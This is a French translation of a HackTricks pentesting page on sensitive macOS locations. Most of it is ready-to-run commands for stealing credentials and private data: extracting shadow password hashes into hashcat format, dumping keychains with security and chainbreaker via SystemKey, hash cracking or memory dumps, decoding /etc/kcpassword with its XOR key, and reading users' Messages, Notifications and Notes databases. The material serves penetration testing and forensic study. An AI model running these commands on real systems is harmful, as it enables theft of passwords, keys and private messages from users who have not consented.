# Emplacements sensibles macOS

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mots de passe

### Mots de passe Shadow

Le mot de passe shadow est stocké avec la configuration de l'utilisateur dans des plists situés dans **`/var/db/dslocal/nodes/Default/users/`**.\
La commande suivante peut être utilisée pour extraire **toutes les informations sur les utilisateurs** (y compris les informations de hash) :

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
```bash
dscl . list /Users | grep -v '^_' | while read user; do echo -n "$user:"; dscl . -read /Users/$user dsAttrTypeNative:ShadowHashData | tr -d ' ' | cut -d '[' -f2 | cut -d ']' -f1 | xxd -r -p | base64; echo; done
```
{% endcode %}

[**Des scripts comme celui-ci**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**celui-là**](https://github.com/octomagon/davegrohl.git) peuvent être utilisés pour transformer le hachage au **format hashcat**.

Une alternative en une ligne qui extraira les identifiants de tous les comptes non-service au format hashcat `-m 7100` (macOS PBKDF2-SHA512) :

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Vidage du trousseau d'accès

Notez que lors de l'utilisation du binaire security pour **dumper les mots de passe déchiffrés**, plusieurs invites demanderont à l'utilisateur d'autoriser cette opération.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Selon ce commentaire [juuso/keychaindump#10 (commentaire)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), il semble que ces outils ne fonctionnent plus sur Big Sur.
{% endhint %}

L'attaquant doit toujours accéder au système et élever ses privilèges en **root** pour exécuter **keychaindump**. Cette approche a ses propres conditions. Comme mentionné précédemment, **lors de la connexion, votre trousseau est déverrouillé par défaut** et reste déverrouillé pendant que vous utilisez votre système. Cela est fait pour la commodité de l'utilisateur afin qu'il n'ait pas à entrer son mot de passe chaque fois qu'une application souhaite accéder au trousseau. Si l'utilisateur a modifié ce paramètre et choisi de verrouiller le trousseau après chaque utilisation, keychaindump ne fonctionnera plus ; il repose sur un trousseau déverrouillé pour fonctionner.

Il est important de comprendre comment Keychaindump extrait les mots de passe de la mémoire. Le processus le plus important dans cette transaction est le **processus "securityd"**. Apple décrit ce processus comme un **daemon de contexte de sécurité pour l'autorisation et les opérations cryptographiques**. Les bibliothèques de développeurs Apple ne disent pas grand-chose à ce sujet ; cependant, elles nous indiquent que securityd gère l'accès au trousseau. Dans sa recherche, Juuso fait référence à **la clé nécessaire pour déchiffrer le trousseau comme "La Clé Maîtresse"**. Un certain nombre d'étapes doivent être effectuées pour acquérir cette clé car elle est dérivée du mot de passe de connexion OS X de l'utilisateur. Si vous voulez lire le fichier trousseau, vous devez avoir cette clé maîtresse. Les étapes suivantes peuvent être effectuées pour l'acquérir. **Effectuez un scan du tas de securityd (keychaindump fait cela avec la commande vmmap)**. Les clés maîtresses possibles sont stockées dans une zone marquée comme MALLOC_TINY. Vous pouvez voir les emplacements de ces tas vous-même avec la commande suivante :
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** va ensuite rechercher dans les tas retournés les occurrences de 0x0000000000000018. Si la valeur suivante de 8 octets pointe vers le tas actuel, nous avons trouvé une clé maîtresse potentielle. À partir de là, un peu de désobfuscation doit encore se produire, ce qui peut être vu dans le code source, mais en tant qu'analyste, la partie la plus importante à noter est que les données nécessaires pour déchiffrer cette information sont stockées dans la mémoire du processus de securityd. Voici un exemple de sortie de keychain dump.
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants d'un trousseau OSX de manière judiciairement fiable :

* Mot de passe du trousseau hashé, adapté pour le cracking avec [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
* Mots de passe Internet
* Mots de passe génériques
* Clés privées
* Clés publiques
* Certificats X509
* Notes sécurisées
* Mots de passe Appleshare

Étant donné le mot de passe de déverrouillage du trousseau, une clé maître obtenue en utilisant [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de déverrouillage tel que SystemKey, Chainbreaker fournira également les mots de passe en clair.

Sans l'une de ces méthodes pour déverrouiller le trousseau, Chainbreaker affichera toutes les autres informations disponibles.

### **Extraire les clés du trousseau**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec les mots de passe) avec SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec mots de passe) en cassant le hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec mots de passe) avec un dump de mémoire**

[Suivez ces étapes](..#dumping-memory-with-osxpmem) pour réaliser un **dump de mémoire**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec les mots de passe) en utilisant le mot de passe de l'utilisateur**

Si vous connaissez le mot de passe de l'utilisateur, vous pouvez l'utiliser pour **extraire et déchiffrer les trousseaux qui appartiennent à l'utilisateur**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Le fichier **kcpassword** est un fichier qui contient **le mot de passe de connexion de l'utilisateur**, mais seulement si le propriétaire du système a **activé la connexion automatique**. Par conséquent, l'utilisateur sera automatiquement connecté sans qu'on lui demande de mot de passe (ce qui n'est pas très sécurisé).

Le mot de passe est stocké dans le fichier **`/etc/kcpassword`** xored avec la clé **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si le mot de passe de l'utilisateur est plus long que la clé, la clé sera réutilisée.\
Cela rend la récupération du mot de passe assez facile, par exemple en utilisant des scripts comme [**celui-ci**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informations Intéressantes dans les Bases de Données

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Vous pouvez trouver les données de Notifications dans `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La plupart des informations intéressantes se trouveront dans **blob**. Vous devrez donc **extraire** ce contenu et le **transformer** en format **lisible par l'homme** ou utiliser **`strings`**. Pour y accéder, vous pouvez faire :

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notes

Les **notes** des utilisateurs peuvent être trouvées dans `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
```markdown
{% endcode %}

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
